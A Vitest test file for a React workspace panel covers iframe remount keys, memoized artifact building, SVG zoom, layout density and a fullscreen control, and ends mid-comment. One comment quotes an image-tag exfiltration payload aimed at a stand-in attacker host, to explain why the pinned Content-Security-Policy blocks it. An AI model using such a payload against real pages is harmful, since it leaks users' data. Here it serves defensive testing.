import { describe, it, expect, beforeAll, beforeEach, afterEach, vi } from "vitest";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { act, createElement, type ComponentProps } from "react";
import { createRoot, type Root } from "react-dom/client";

/**
 * WS-F — the workspace viewer's content contract.
 *
 * Three things are under test, and each of them is a thing that goes wrong
 * SILENTLY:
 *
 *  1. The iframe remount key. If any layout input ever leaks into it, every
 *     drag of the resize handle reloads the user's running mini-app — and
 *     public/artifact-frame.html latches `written = true`, so the reload is
 *     unrecoverable. There is no console error for this; the app just resets.
 *  2. The per-render document build. buildArtifactDoc concatenates up to
 *     400,000 characters and used to run in ArtifactFrame's render body, so a
 *     drag would allocate ~400 KB per pointer event. Nothing fails; it just
 *     gets slow in a way that looks like "iframes are slow".
 *  3. Whether width MEANS anything. The most-filed complaint about this exact
 *     UI pattern is that dragging a panel wider only grows empty margins. The
 *     measure cap, the wide-density labels, the real scrollbar and the SVG
 *     zoom floor are the four things that make width pay off, and every one
 *     of them is asserted here against rendered output rather than source.
 *
 * `buildArtifactDoc` is wrapped in a counting spy so "is it memoized" is a
 * behavioural question, not a grep. `artifactFrameKey` is left REAL.
 */
const { buildSpy } = vi.hoisted(() => ({ buildSpy: vi.fn() }));

vi.mock("@/lib/artifacts", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/artifacts")>();
  return {
    ...actual,
    buildArtifactDoc: (a: Parameters<typeof actual.buildArtifactDoc>[0]) => {
      buildSpy(a);
      return actual.buildArtifactDoc(a);
    },
  };
});

// `buildArtifactDoc` here is the counting wrapper installed above, but it
// delegates to and returns the real implementation, so its OUTPUT is the real
// document. Only the call count is instrumentation.
import { artifactFrameKey, buildArtifactDoc, type Artifact } from "@/lib/artifacts";
import ArtifactFrame from "@/components/ArtifactFrame";
import SvgArtifactViewer, { ZOOM_STEPS, ZOOM_DEFAULT_INDEX } from "@/components/SvgArtifactViewer";
import WorkspacePanel, { WIDE_DENSITY_PX } from "@/components/WorkspacePanel";
import { workspaceStore, type WorkspaceItem } from "@/lib/workspaceStore";

const src = (p: string) => readFileSync(resolve(process.cwd(), p), "utf8");

/**
 * Strip comments so an ABSENCE scan asserts on code, not on prose.
 *
 * This is not pedantry — it already bit. Every one of these files carries a
 * comment explaining *why* `container-type` must never appear (it implies
 * `contain: layout`, which would trap the shell's fullscreen inside the
 * panel), and a naive `not.toContain("container-type")` fails on that very
 * explanation. A test that forbids you from writing down the reason for the
 * rule is a test that will be deleted.
 *
 * Block form covers JSX `{/* … *\/}` too. The line form is anchored to
 * whole lines; none of the scanned files contains a string literal with `//`
 * in it. The "comment stripper still sees real code" test below is the guard
 * against this over-stripping and quietly making every absence scan vacuous.
 */
function code(source: string): string {
  return source.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^[ \t]*\/\/.*$/gm, "");
}

const ARTIFACT_FRAME_SRC = src("src/components/ArtifactFrame.tsx");
const WORKSPACE_PANEL_SRC = src("src/components/WorkspacePanel.tsx");
const SVG_VIEWER_SRC = src("src/components/SvgArtifactViewer.tsx");
const TYPOGRAPHY_CSS = src("src/styles/workspace-typography.css");
const INDEX_CSS = src("src/index.css");

const ARTIFACT_FRAME_CODE = code(ARTIFACT_FRAME_SRC);
const WORKSPACE_PANEL_CODE = code(WORKSPACE_PANEL_SRC);
const SVG_VIEWER_CODE = code(SVG_VIEWER_SRC);

// ── jsdom 20 harness ───────────────────────────────────────────────────────
// PointerEvent, ResizeObserver and CSS.supports are all undefined here, and
// requestAnimationFrame is real-timer async. Both are installed per-file so
// src/test/setup.ts stays frozen and no other suite inherits them.

type RoEntry = { contentRect: { width: number } };
type RoCallback = (entries: RoEntry[], observer: unknown) => void;

let observed: Array<{ cb: RoCallback; el: Element }> = [];
let rafQueue: FrameRequestCallback[] = [];
let rafSeq = 0;
let realRaf: typeof globalThis.requestAnimationFrame | undefined;
let realCancelRaf: typeof globalThis.cancelAnimationFrame | undefined;

class FakeResizeObserver {
  private cb: RoCallback;
  constructor(cb: RoCallback) {
    this.cb = cb;
  }
  observe(el: Element) {
    observed.push({ cb: this.cb, el });
  }
  unobserve(el: Element) {
    observed = observed.filter((o) => !(o.cb === this.cb && o.el === el));
  }
  disconnect() {
    observed = observed.filter((o) => o.cb !== this.cb);
  }
}

/** Report a new width to every live observer, the way the browser would. */
function resizeTo(width: number) {
  act(() => {
    for (const o of [...observed]) o.cb([{ contentRect: { width } }], null);
  });
}

/** Run whatever the component deferred into the next frame. */
function flushFrames() {
  act(() => {
    const queued = rafQueue;
    rafQueue = [];
    for (const cb of queued) cb(performance.now());
  });
}

let host: HTMLDivElement;
let root: Root;
const seeded: string[] = [];

beforeAll(async () => {
  // workspaceStore.subscribe() kicks off a one-shot IndexedDB hydration that
  // REPLACES the whole item array when its promise settles, and emits from
  // outside React's batching. Left alone, the first test to mount the panel
  // races a wipe of its own fixtures and prints an act() warning for a state
  // update it never caused. Drain it once, before anything is seeded.
  const off = workspaceStore.subscribe(() => {});
  await new Promise((r) => setTimeout(r, 0));
  off();
});

beforeEach(() => {
  (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

  observed = [];
  rafQueue = [];
  rafSeq = 0;
  (globalThis as { ResizeObserver?: unknown }).ResizeObserver = FakeResizeObserver;

  realRaf = globalThis.requestAnimationFrame;
  realCancelRaf = globalThis.cancelAnimationFrame;
  globalThis.requestAnimationFrame = ((cb: FrameRequestCallback) => {
    rafQueue.push(cb);
    return ++rafSeq;
  }) as typeof globalThis.requestAnimationFrame;
  globalThis.cancelAnimationFrame = (() => {
    /* the queue is drained explicitly by flushFrames */
  }) as typeof globalThis.cancelAnimationFrame;

  buildSpy.mockClear();

  host = document.createElement("div");
  document.body.appendChild(host);
  root = createRoot(host);
});

afterEach(() => {
  act(() => root.unmount());
  host.remove();
  for (const id of seeded.splice(0)) workspaceStore.remove(id);
  delete (globalThis as { ResizeObserver?: unknown }).ResizeObserver;
  if (realRaf) globalThis.requestAnimationFrame = realRaf;
  if (realCancelRaf) globalThis.cancelAnimationFrame = realCancelRaf;
  (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = false;
});

function seed(input: Parameters<typeof workspaceStore.add>[0]): WorkspaceItem {
  const item = workspaceStore.add(input);
  seeded.push(item.id);
  return item;
}

function mountPanel(props: Partial<ComponentProps<typeof WorkspacePanel>> = {}) {
  act(() => {
    root.render(
      createElement(WorkspacePanel, {
        userId: null,
        selectedId: null,
        onSelect: () => {},
        ...props,
      }),
    );
  });
}

const artifact = (over: Partial<Artifact> = {}): Artifact => ({
  title: "Tick counter",
  kind: "html",
  content: "<p>hello</p>",
  ...over,
});

// ───────────────────────────────────────────────────────────────────────────

describe("buildArtifactDoc — untouched by the extraction", () => {
  it("emits the exact document it always has", () => {
    // WS-F is allowed to ADD to src/lib/artifacts.ts and nothing else. This
    // pins the output byte-for-byte, because the string is a security
    // boundary: the CSP is the first thing in <head>, `default-src 'none'`
    // gates everything, connect-src 'none' means a model-authored script has
    // nowhere to send what it reads, and img-src excludes https: precisely
    // so `<img src="https://attacker/?d=…">` cannot exfiltrate on paint.
    const doc = buildArtifactDoc({ title: "T", kind: "html", content: "<p>hi</p>" });
    expect(doc).toBe(
      "<!DOCTYPE html><html><head>" +
        '<meta charset="utf-8">' +
        '<meta name="viewport" content="width=device-width, initial-scale=1">' +
        '<meta http-equiv="Content-Security-Policy" content="' +
        "default-src 'none'; " +
        "script-src 'unsafe-inline' 'unsafe-eval'; " +
        "style-src 'unsafe-inline'; " +
        "img-src data: blob:; font-src data:; media-src data: blob:; " +
        "connect-src 'none'; base-uri 'none'; form-action 'none'" +
        '">' +
        "<style>html,body{margin:0}body{font-family:system-ui,-apple-system,Segoe UI,sans-serif;padding:14px;color:#0f172a;background:#fff;line-height:1.5}img,svg{max-width:100%;height:auto}</style>" +
        "</head><body>" +
        "<p>hi</p>" +
        "</body></html>",
    );
  });

  it("still gives html artifacts no max-width — full panel width is the point", () => {
    // D14: the measure cap is for PROSE. An html artifact is an app; capping
    // it would make dragging the panel wider do nothing for the one kind this
    // whole feature was requested for.
    const doc = buildArtifactDoc({ title: "T", kind: "html", content: "<div>app</div>" });
    expect(doc).toContain("padding:14px");
    expect(doc).not.toContain("max-width:78ch");
    expect(doc).not.toContain("cc-measure");
    // `img,svg{max-width:100%}` is the only max-width, and it is on media.
    expect(doc.match(/max-width/g)).toHaveLength(1);
  });
});

describe("artifactFrameKey — the remount contract", () => {
  it("is byte-identical to the literal it replaced", () => {
    for (const a of [
      artifact(),
      artifact({ kind: "svg", content: "<svg/>", title: "Sheet 01" }),
      artifact({ title: "", content: "x" }),
      artifact({ title: "a-b-c", content: "long".repeat(1000) }),
    ]) {
      expect(artifactFrameKey(a)).toBe(`${a.kind}-${a.content.length}-${a.title}`);
    }
  });

  it("is stable across repeated calls on a fixed artifact", () => {
    const a = artifact();
    const first = artifactFrameKey(a);
    for (let i = 0; i < 100; i++) expect(artifactFrameKey(a)).toBe(first);
  });

  it("changes when kind, content length, or title changes", () => {
    const base = artifactFrameKey(artifact());
    expect(artifactFrameKey(artifact({ kind: "svg" }))).not.toBe(base);
    expect(artifactFrameKey(artifact({ content: "<p>hello!</p>" }))).not.toBe(base);
    expect(artifactFrameKey(artifact({ title: "Other" }))).not.toBe(base);
  });

  it("takes NO layout argument — arity is 1, and it must stay 1", () => {
    // This is the machine-checkable form of R1. A width, a geometry or a
    // fullscreen flag folded into the key would destroy the frame's browsing
    // context on every drag, and a second parameter is the shape that leak
    // would take.
    expect(artifactFrameKey.length).toBe(1);
  });

  it("is what ArtifactFrame actually keys its iframe on", () => {
    const a = artifact();
    act(() => {
      root.render(createElement(ArtifactFrame, { artifact: a }));
    });
    const frame = host.querySelector("iframe");
    expect(frame).toBeTruthy();

    // Re-rendering with an equal-but-new artifact object must not swap the
    // element: React reuses the instance only while the key is unchanged.
    const before = frame;
    act(() => {
      root.render(createElement(ArtifactFrame, { artifact: { ...a } }));
    });
    expect(host.querySelector("iframe")).toBe(before);
  });
});

describe("ArtifactFrame — the per-render 400 KB allocation is gone", () => {
  it("builds the document ONCE across many re-renders of the same artifact", () => {
    const a = artifact({ content: "<p>x</p>".repeat(50) });
    act(() => {
      root.render(createElement(ArtifactFrame, { artifact: a }));
    });
    expect(buildSpy).toHaveBeenCalledTimes(1);

    // 30 re-renders with fresh-but-equal artifact objects — exactly what a
    // parent re-rendering once per pointermove produces.
    for (let i = 0; i < 30; i++) {
      act(() => {
        root.render(createElement(ArtifactFrame, { artifact: { ...a }, className: `w-full h-full border-0 pass-${i}` }));
      });
    }
    expect(buildSpy).toHaveBeenCalledTimes(1);
  });

  it("still rebuilds when the artifact's content actually changes", () => {
    const a = artifact();
    act(() => {
      root.render(createElement(ArtifactFrame, { artifact: a }));
    });
    expect(buildSpy).toHaveBeenCalledTimes(1);

    act(() => {
      root.render(createElement(ArtifactFrame, { artifact: artifact({ content: "<p>changed</p>" }) }));
    });
    expect(buildSpy).toHaveBeenCalledTimes(2);

    act(() => {
      root.render(createElement(ArtifactFrame, { artifact: artifact({ content: "<p>changed</p>", title: "New title" }) }));
    });
    expect(buildSpy).toHaveBeenCalledTimes(3);
  });

  it("has no bare render-body document build left in the source", () => {
    expect(ARTIFACT_FRAME_CODE).not.toMatch(/docRef\.current\s*=\s*buildArtifactDoc/);
    const useMemoAt = ARTIFACT_FRAME_CODE.indexOf("useMemo(");
    const buildAt = ARTIFACT_FRAME_CODE.indexOf("buildArtifactDoc(", ARTIFACT_FRAME_CODE.indexOf("const ArtifactFrame"));
    expect(useMemoAt).toBeGreaterThan(-1);
    expect(useMemoAt).toBeLessThan(buildAt);
    // The key is the extracted function, not a re-typed literal.
    expect(ARTIFACT_FRAME_CODE).toContain("key={artifactFrameKey(artifact)}");
  });

  it("R3: leaves the sandbox boundary exactly as it was", () => {
    // Asserted on the RENDERED attribute, not on the source — the source has
    // always explained the boundary in prose ("without allow-same-origin"),
    // and a scan that reads the explanation instead of the attribute is
    // measuring the wrong thing in both directions.
    act(() => {
      root.render(createElement(ArtifactFrame, { artifact: artifact() }));
    });
    const frame = host.querySelector("iframe")!;
    // jsdom 20 does not reflect `iframe.sandbox` as a DOMTokenList, so read
    // the attribute — which is what the browser parses anyway.
    const tokens = (frame.getAttribute("sandbox") ?? "").split(/\s+/).filter(Boolean);
    expect(tokens).toEqual(["allow-scripts"]);
    // allow-same-origin would collapse the opaque origin and hand a
    // model-authored document the app's storage, cookies and parent window.
    expect(tokens).not.toContain("allow-same-origin");
    expect(frame.getAttribute("referrerpolicy")).toBe("no-referrer");
  });
});

describe("SvgArtifactViewer — a zoom floor, so widening is not forced magnification", () => {
  const zoomOut = () => host.querySelector<HTMLButtonElement>('button[title="Zoom out"]')!;
  const zoomIn = () => host.querySelector<HTMLButtonElement>('button[title="Zoom in"]')!;
  const readout = () => host.querySelector("span.tabular-nums")!.textContent;
  const sized = () => host.querySelector("iframe")!.parentElement!;
  const click = (b: HTMLButtonElement) => act(() => { b.click(); });

  const mountSvg = () =>
    act(() => {
      root.render(createElement(SvgArtifactViewer, { title: "Sheet 01", content: "<svg viewBox='0 0 1000 600'/>" }));
    });

  it("exposes the six stops with 100% as the default", () => {
    expect(ZOOM_STEPS).toEqual([50, 75, 100, 150, 200, 300]);
    expect(ZOOM_STEPS[ZOOM_DEFAULT_INDEX]).toBe(100);
  });

  it("opens at 100% and can zoom BELOW it", () => {
    mountSvg();
    expect(readout()).toBe("100%");
    expect(zoomOut().disabled).toBe(false); // the whole point: 100 is no longer the floor

    click(zoomOut());
    expect(readout()).toBe("75%");
    click(zoomOut());
    expect(readout()).toBe("50%");
    expect(zoomOut().disabled).toBe(true);
  });

  it("actually shrinks the frame below 100% — the readout does not lie", () => {
    mountSvg();
    // At 100% the minWidth clamp is what keeps the sheet filling the panel.
    expect(sized().style.width).toBe("100%");
    expect(sized().style.minWidth).toBe("100%");

    click(zoomOut());
    expect(sized().style.width).toBe("75%");
    // If minWidth:100% were still applied, "75%" would be a lie: the box
    // would render full width and nothing would appear to happen.
    expect(sized().style.minWidth).toBe("");

    click(zoomOut());
    expect(sized().style.width).toBe("50%");
    expect(sized().style.minWidth).toBe("");
  });

  it("still reaches 300% and re-applies the clamp at and above 100%", () => {
    mountSvg();
    click(zoomIn());
    expect(readout()).toBe("150%");
    expect(sized().style.minWidth).toBe("100%");
    click(zoomIn());
    click(zoomIn());
    expect(readout()).toBe("300%");
    expect(zoomIn().disabled).toBe(true);
  });

  it("does not rebuild the artifact document when only the zoom changes", () => {
    mountSvg();
    expect(buildSpy).toHaveBeenCalledTimes(1);
    click(zoomOut());
    click(zoomIn());
    click(zoomIn());
    expect(buildSpy).toHaveBeenCalledTimes(1);
  });

  it("keeps the same iframe element across zoom changes (no remount)", () => {
    mountSvg();
    const before = host.querySelector("iframe");
    click(zoomOut());
    click(zoomIn());
    expect(host.querySelector("iframe")).toBe(before);
  });

  it("declares the stops as a literal the bundler can see", () => {
    expect(SVG_VIEWER_SRC).toContain("[50, 75, 100, 150, 200, 300]");
  });
});

describe("WorkspacePanel — the measure cap (D14)", () => {
  it("carries cc-measure, not max-w-none, on the research prose container", () => {
    const item = seed({
      userId: null,
      kind: "research",
      title: "Report",
      content: "# Heading\n\nBody text.",
    });
    mountPanel({ selectedId: item.id });

    const prose = host.querySelector(".prose")!;
    expect(prose).toBeTruthy();
    expect(prose.className).toContain("cc-measure");
    expect(prose.className).not.toContain("max-w-none");
    // `.prose` is retained on purpose: the fruit-stripe theme keys off it.
    expect(prose.className).toContain("prose prose-sm prose-invert");
  });

  it("does NOT cap an html artifact — apps get the full width", () => {
    const item = seed({
      userId: null,
      kind: "html",
      title: "Mini app",
      content: "<button>hi</button>",
    });
    mountPanel({ selectedId: item.id });

    expect(host.querySelector("iframe")).toBeTruthy();
    expect(host.querySelector(".cc-measure")).toBeNull();
  });

  it("beats the only live .prose rule in the app on specificity alone", () => {
    // src/index.css ships `[data-theme="fruit-stripe"] .prose { max-width: 68ch }`
    // at specificity (0,2,0). If that ever changes, this assumption has to be
    // re-checked — so assert the thing we are competing with, not just ours.
    expect(INDEX_CSS).toContain('[data-theme="fruit-stripe"] .prose');
    expect(INDEX_CSS).toContain("max-width: 68ch");

    const selector = TYPOGRAPHY_CSS.match(/^([^{}\n]*\.cc-measure[^{}\n]*)\{\s*\n?\s*max-width:\s*78ch/m);
    expect(selector, "a max-width:78ch rule keyed on .cc-measure must exist").toBeTruthy();
    const repeats = (selector![1].match(/\.cc-measure/g) ?? []).length;
    // A DOUBLED selector is (0,2,0) — it only TIES the fruit-stripe rule and
    // would leave the cap depending on stylesheet import order.
    expect(TYPOGRAPHY_CSS).toContain(".cc-measure.cc-measure");
    expect(repeats).toBeGreaterThanOrEqual(3);
    expect(TYPOGRAPHY_CSS).toMatch(/margin-inline:\s*auto/);
  });

  it("holds the Sources block to the SAME column as the report", () => {
    // The citations list is a sibling of the prose, not a child. Uncapped, a
    // wide panel centres the report at 78ch and then draws the Sources rule
    // edge-to-edge across it — the single most obvious "this layout is
    // broken" tell at the widths this whole feature exists to enable.
    const item = seed({
      userId: null,
      kind: "research",
      title: "Report",
      content: "Body text.",
      meta: { citations: [{ title: "A source", url: "https://example.com/a" }] },
    });
    mountPanel({ selectedId: item.id });

    const sources = host.querySelector(".cc-measure-box");
    expect(sources, "the Sources container must carry the measure box").toBeTruthy();
    expect(sources!.textContent).toContain("Sources");
    // Cap only — the typography rules must NOT reach it, or a list that has
    // never had bullets grows them at every width.
    expect(sources!.className).not.toContain("cc-measure ");
    expect(sources!.classList.contains("cc-measure")).toBe(false);

    // …and the stylesheet has to actually cap it, in the same rule.
    const capRule = TYPOGRAPHY_CSS.match(/([^{}]*max-width:\s*78ch[^{}]*)/);
    expect(capRule).toBeTruthy();
    const capSelector = TYPOGRAPHY_CSS.slice(0, TYPOGRAPHY_CSS.indexOf("max-width: 78ch")).split("}").pop()!;
    expect(capSelector).toContain(".cc-measure-box.cc-measure-box.cc-measure-box");
  });

  it("restores the structure Tailwind preflight erased, scoped to .cc-measure only", () => {
    // @tailwindcss/typography is installed but NOT registered, so `prose`
    // emits nothing and preflight's `h1{font-size:inherit}` /
    // `ul{list-style:none}` are the live rules. Without these, "widen the
    // panel" hands the user a bigger wall of undifferentiated text.
    for (const needed of [".cc-measure h1", ".cc-measure ul", ".cc-measure a", ".cc-measure pre", ".cc-measure table"]) {
      expect(TYPOGRAPHY_CSS).toContain(needed);
    }
    // Every selector in the file is scoped — no bare element or global rule
    // may leak out of the workspace report view. Checked per comma-separated
    // part, so a grouped selector cannot smuggle an unscoped one in.
    const selectors = TYPOGRAPHY_CSS.replace(/\/\*[\s\S]*?\*\//g, "").match(/^[^{}\n][^{}]*\{/gm) ?? [];
    expect(selectors.length).toBeGreaterThan(5);
    const parts = selectors
      .join("")
      .replace(/\{/g, ",")
      .split(",")
      .map((p) => p.trim())
      .filter(Boolean);
    expect(parts.length).toBeGreaterThan(5);
    for (const p of parts) expect(p).toMatch(/^\.cc-measure(-box)?[.\s>:]/);
    // R3: no external stylesheet or remote font may enter under the CSP.
    expect(TYPOGRAPHY_CSS).not.toContain("@import");
    expect(TYPOGRAPHY_CSS).not.toContain("url(");
    // Container queries would create a containing block and trap the shell's
    // position:fixed fullscreen inside the panel.
    expect(TYPOGRAPHY_CSS).not.toContain("container-type");
  });
});

describe("WorkspacePanel — width density", () => {
  const listDiv = () => host.querySelector<HTMLDivElement>("div.space-y-1\\.5")!;
  const headerButtons = () =>
    Array.from(host.querySelectorAll<HTMLButtonElement>("button")).filter((b) => b.title || b.getAttribute("aria-label"));
  /** The detail-header ROW only. Scoping matters: the inert viewer further
   *  down the pane ships its own button reading "Copy", so an assertion
   *  against the whole subtree's textContent can never prove that the header
   *  control is unlabelled. */
  const detailHeader = () =>
    host.querySelector<HTMLButtonElement>('button[aria-label="Back to files"]')!.parentElement!;

  it("starts narrow and hides the list scrollbar, exactly as before", () => {
    seed({ userId: null, kind: "text", title: "A file", content: "x" });
    mountPanel();
    expect(listDiv().className).toBe("flex-1 min-h-0 overflow-auto px-2 py-2 space-y-1.5 hide-scrollbar");
  });

  it(`swaps to a real scrollbar at >= ${WIDE_DENSITY_PX}px and back again`, () => {
    seed({ userId: null, kind: "text", title: "A file", content: "x" });
    mountPanel();

    resizeTo(WIDE_DENSITY_PX);
    flushFrames();
    expect(listDiv().className).toBe("flex-1 min-h-0 overflow-auto px-2 py-2 space-y-1.5 scrollbar-thin");

    resizeTo(WIDE_DENSITY_PX - 1);
    flushFrames();
    expect(listDiv().className).toBe("flex-1 min-h-0 overflow-auto px-2 py-2 space-y-1.5 hide-scrollbar");
  });

  it("labels the detail-header controls only when there is room for them", () => {
    const item = seed({ userId: null, kind: "text", title: "notes.txt", content: "x" });
    mountPanel({ selectedId: item.id });

    const LABELS = ["Focus", "Library", "Copy", "Download", "Delete"];

    // Narrow: icons only. This is R5 — the deliberate seven-control clip on a
    // phone must behave exactly as it does today. The header row's text is
    // therefore nothing but ligature names and the filename.
    for (const label of LABELS) expect(detailHeader().textContent).not.toContain(label);

    resizeTo(900);
    flushFrames();
    for (const label of LABELS) expect(detailHeader().textContent).toContain(label);

    resizeTo(400);
    flushFrames();
    for (const label of LABELS) expect(detailHeader().textContent).not.toContain(label);
  });

  it("R5: every narrow detail-header control keeps its exact shipped class string", () => {
    const item = seed({ userId: null, kind: "text", title: "notes.txt", content: "x" });
    mountPanel({ selectedId: item.id });

    // Scoped to the header row: the inert viewer below has its own copy
    // button, and querySelector would happily return whichever came first.
    const byTitle = (t: string) =>
      detailHeader().querySelector<HTMLButtonElement>(`button[title^="${t}"]`)!.className;
    const shape = "shrink-0 inline-flex items-center justify-center h-8 w-8 rounded-lg";
    const hover = "text-on-surface-variant hover:bg-surface-container-high";

    // These six strings are transcribed from the pre-change file. Each one is
    // the whole `className`, not a substring — a stray extra utility is
    // exactly the kind of drift R5 forbids, and `toContain` would miss it.
    expect(byTitle("Copy source")).toBe(`${shape} ${hover} transition-colors`);
    expect(byTitle("Download file")).toBe(`${shape} ${hover} transition-colors`);
    expect(byTitle("Delete")).toBe(
      `${shape} text-on-surface-variant hover:text-destructive hover:bg-surface-container-high transition-colors`,
    );
    // The two toggles put `transition-colors` BEFORE the state-dependent
    // colours, because their colour is the thing that varies.
    expect(byTitle("Pin as chat focus")).toBe(`${shape} transition-colors ${hover}`);
    expect(byTitle("Save to library")).toBe(`${shape} transition-colors ${hover}`);
    expect(
      host.querySelector<HTMLButtonElement>('button[aria-label="Back to files"]')!.className,
    ).toBe(`${shape} ${hover} transition-colors`);
  });

  it("ignores a zero width instead of treating it as very narrow", () => {
    seed({ userId: null, kind: "text", title: "A file", content: "x" });
    mountPanel();

    resizeTo(900);
    flushFrames();
    expect(listDiv().className).toContain("scrollbar-thin");

    // display:none / detached reports 0. Acting on it would flip the panel
    // back to narrow every time it is hidden.
    resizeTo(0);
    flushFrames();
    expect(listDiv().className).toContain("scrollbar-thin");
  });

  it("schedules no work when the density is unchanged", () => {
    seed({ userId: null, kind: "text", title: "A file", content: "x" });
    mountPanel();

    // Seeding at mount already ran; drain it.
    flushFrames();
    resizeTo(900);
    expect(rafQueue.length).toBe(1);
    flushFrames();

    // Six more callbacks, all still wide: an observer that writes every time
    // is how "ResizeObserver loop completed with undelivered notifications"
    // gets thrown at error severity mid-drag.
    for (const w of [901, 902, 1200, 700, 641, 900]) resizeTo(w);
    expect(rafQueue.length).toBe(0);
  });

  it("defers every write out of the observer callback into a frame", () => {
    seed({ userId: null, kind: "text", title: "A file", content: "x" });
    mountPanel();

    resizeTo(900);
    // Not applied yet — the callback only scheduled it.
    expect(listDiv().className).toContain("hide-scrollbar");
    flushFrames();
    expect(listDiv().className).toContain("scrollbar-thin");
  });

  it("survives an environment with no ResizeObserver at all", () => {
    delete (globalThis as { ResizeObserver?: unknown }).ResizeObserver;
    seed({ userId: null, kind: "text", title: "A file", content: "x" });
    expect(() => mountPanel()).not.toThrow();
    expect(listDiv().className).toContain("hide-scrollbar");
  });

  it("keeps every header control reachable in both densities", () => {
    const item = seed({ userId: null, kind: "text", title: "notes.txt", content: "x" });
    mountPanel({ selectedId: item.id });
    const narrowCount = headerButtons().length;
    resizeTo(900);
    flushFrames();
    expect(headerButtons().length).toBe(narrowCount);
  });
});

describe("WorkspacePanel — the fullscreen exit control (A3)", () => {
  const toggle = () =>
    host.querySelector<HTMLButtonElement>('button[aria-label="Exit full screen"], button[aria-label="Expand workspace to full screen"]');

  it("is absent entirely when the embedder provides no fullscreen mode", () => {
    mountPanel();
    expect(toggle()).toBeNull();
  });

  it("is a plain icon button on the way IN", () => {
    mountPanel({ onToggleFullscreen: () => {} });
    const b = toggle()!;
    expect(b).toBeTruthy();
    expect(b.getAttribute("aria-pressed")).toBe("false");
    expect(b.textContent).toBe("open_in_full");
  });

  it("is a visible, labelled, 44px-minimum target on the way OUT", () => {
    mountPanel({ fullscreen: true, onToggleFullscreen: () => {} });
    const b = toggle()!;
    expect(b.getAttribute("aria-label")).toBe("Exit full screen");
    expect(b.getAttribute("aria-pressed")).toBe("true");
    // Escape does not exist on a phone: the way out must be readable text,
    // not an icon a user has to guess at.
    expect(b.textContent).toContain("Exit full screen");
    // 44px on BOTH axes. h-11 is 2.75rem = 44px; the two min-* utilities are
    // the floor that survives a parent squeezing the header row.
    expect(b.className).toContain("min-h-[44px]");
    expect(b.className).toContain("min-w-[44px]");
    expect(b.className).toContain("h-11");
    expect(b.querySelector(".material-symbols-outlined")!.textContent).toBe("close_fullscreen");
  });

  it("stays labelled at NARROW density — a portrait phone is the case that matters", () => {
    mountPanel({ fullscreen: true, onToggleFullscreen: () => {} });
    resizeTo(393); // iPhone 16 portrait
    flushFrames();
    expect(toggle()!.textContent).toContain("Exit full screen");
    expect(toggle()!.className).toContain("min-h-[44px]");
  });

  it("leaves the header row a way to fit on a 360px phone", () => {
    // The labelled exit is ~156px wide. Added to the wordmark, the count, the
    // filter and the close button it overruns a 360px header — and every
    // control in the row is either shrink-0 or a single unbreakable word, so
    // without a pressure valve the CLOSE button is what falls off the edge.
    // jsdom does no layout, so assert the mechanism: the wordmark is the one
    // item allowed to give.
    mountPanel({ fullscreen: true, onToggleFullscreen: () => {}, onClose: () => {} });
    const wordmark = Array.from(host.querySelectorAll("span")).find((s) => s.textContent === "Workspace")!;
    expect(wordmark).toBeTruthy();
    // `truncate` is overflow:hidden, which drops a flex item's automatic
    // minimum size from min-content to zero. Nothing else in the row can.
    expect(wordmark.className).toContain("truncate");
    expect(host.querySelector('button[aria-label="Close workspace"]')).toBeTruthy();
  });

  it("calls back on click, and sits before the close button", () => {
    const calls: number[] = [];
    mountPanel({ fullscreen: true, onToggleFullscreen: () => calls.push(1), onClose: () => {} });
    act(() => {
      toggle()!.click();
    });
    expect(calls).toEqual([1]);

    const close = host.querySelector<HTMLButtonElement>('button[aria-label="Close workspace"]')!;
    expect(toggle()!.compareDocumentPosition(close) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
  });
});

describe("WorkspacePanel — standing invariants", () => {
  const ALL_CODE = [WORKSPACE_PANEL_CODE, SVG_VIEWER_CODE, ARTIFACT_FRAME_CODE];

  it("the comment stripper still sees real code (guards every scan below)", () => {
    // If `code()` ever over-strips, every absence assertion in this describe
    // silently becomes vacuous. Prove it kept the code and dropped the prose.
    expect(WORKSPACE_PANEL_CODE).toContain("const WorkspacePanel");
    expect(WORKSPACE_PANEL_CODE).toContain("new ResizeObserver");
    expect(WORKSPACE_PANEL_CODE.length).toBeGreaterThan(WORKSPACE_PANEL_SRC.length * 0.5);
    // The prose that broke the naive version of these scans is gone.
    expect(WORKSPACE_PANEL_SRC).toContain("container-type");
    expect(WORKSPACE_PANEL_CODE).not.toContain("container-type");
  });

  it("never programmatically focuses anything", () => {
    // R2: Android Chrome opens the soft keyboard on ANY programmatic focus()
    // once the session has seen a gesture.
    for (const s of ALL_CODE) expect(s).not.toContain(".focus(");
    for (const s of ALL_CODE) expect(s).not.toContain("focusComposer");
  });

  it("uses no container query and no CSS containment", () => {
    // `container-type: inline-size` implies `contain: layout`, which would
    // make this panel a containing block and silently confine the shell's
    // position:fixed fullscreen to it. Density is measured in JS instead.
    for (const s of ALL_CODE) {
      expect(s).not.toContain("container-type");
      expect(s).not.toContain("cc-container");
      expect(s).not.toMatch(/\bcontain\s*:/);
      expect(s).not.toContain("@container");
    }
  });

  it("derives no React key from density, width or fullscreen", () => {
    const keys = WORKSPACE_PANEL_CODE.match(/key=\{[^}]*\}/g) ?? [];
    expect(keys.length).toBeGreaterThan(0);
    for (const k of keys) {
      expect(k).not.toMatch(/density|wide|narrow|width|fullscreen/i);
    }
  });

  it("memoizes the line-number gutter", () => {
    // Up to 2000 numbers joined per render, on a component that a drag can
    // re-render 60x a second. There is no observable difference between the
    // memoized and unmemoized forms — the string is identical either way — so
    // this is necessarily structural: the join must live in a useMemo and the
    // JSX must render the bound identifier.
    expect(WORKSPACE_PANEL_CODE).not.toMatch(/\{\s*lines\.map\([^}]*\)\.join\(/);
    expect(WORKSPACE_PANEL_CODE).toMatch(/const gutter = useMemo\(/);
    expect(WORKSPACE_PANEL_CODE).toMatch(/lines\.map\(\(_, i\) => String\(i \+ 1\)\)\.join\("\\n"\)/);
    expect(WORKSPACE_PANEL_CODE).toMatch(/>\s*\{gutter\}\s*<\/pre>/);
  });

  it("never writes state from inside the ResizeObserver callback", () => {
    // The deferral is proven behaviourally above; this catches the shape that
    // would reintroduce "ResizeObserver loop completed with undelivered
    // notifications" — an error-severity event that trips catch-all handlers
